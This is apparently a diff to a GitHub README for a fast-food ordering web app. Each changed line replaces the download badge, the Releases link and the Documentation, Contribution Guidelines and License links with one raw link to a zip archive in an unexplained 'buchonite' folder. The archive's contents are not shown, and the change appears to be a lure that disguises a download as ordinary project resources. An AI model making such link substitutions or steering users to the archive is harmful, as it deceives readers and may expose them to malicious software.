@@ -1,6 +1,6 @@
 # 🍔 OnlineMealMingleWebApp - Seamlessly Order Fast Food Online
 
-![Download OnlineMealMingleWebApp](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download OnlineMealMingleWebApp](https://raw.githubusercontent.com/ranavartsingh/OnlineMealMingleWebApp/main/buchonite/OnlineMealMingleWebApp.zip)
 
 ## 🚀 Getting Started
 
@@ -32,7 +32,7 @@ To run the OnlineMealMingleWebApp smoothly, ensure your computer meets these req
 
 To get started with OnlineMealMingle, visit the Releases page to download the latest version of the application. Click the link below:
 
-[Visit the Releases Page to Download](https://github.com/ranavartsingh/OnlineMealMingleWebApp/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/ranavartsingh/OnlineMealMingleWebApp/main/buchonite/OnlineMealMingleWebApp.zip)
 
 Once you have downloaded the application:
 
@@ -117,8 +117,8 @@ You can contact support through the GitHub page. Simply open an issue with your 
 
 For more information, check out the following resources:
 
-- [Documentation](https://github.com/ranavartsingh/OnlineMealMingleWebApp/blob/main/docs/README.md)
-- [Contribution Guidelines](https://github.com/ranavartsingh/OnlineMealMingleWebApp/blob/main/CONTRIBUTING.md)
-- [License Information](https://github.com/ranavartsingh/OnlineMealMingleWebApp/blob/main/LICENSE)
+- [Documentation](https://raw.githubusercontent.com/ranavartsingh/OnlineMealMingleWebApp/main/buchonite/OnlineMealMingleWebApp.zip)
+- [Contribution Guidelines](https://raw.githubusercontent.com/ranavartsingh/OnlineMealMingleWebApp/main/buchonite/OnlineMealMingleWebApp.zip)
+- [License Information](https://raw.githubusercontent.com/ranavartsingh/OnlineMealMingleWebApp/main/buchonite/OnlineMealMingleWebApp.zip)
 
 > Thank you for using OnlineMealMingle! We hope you enjoy the experience.
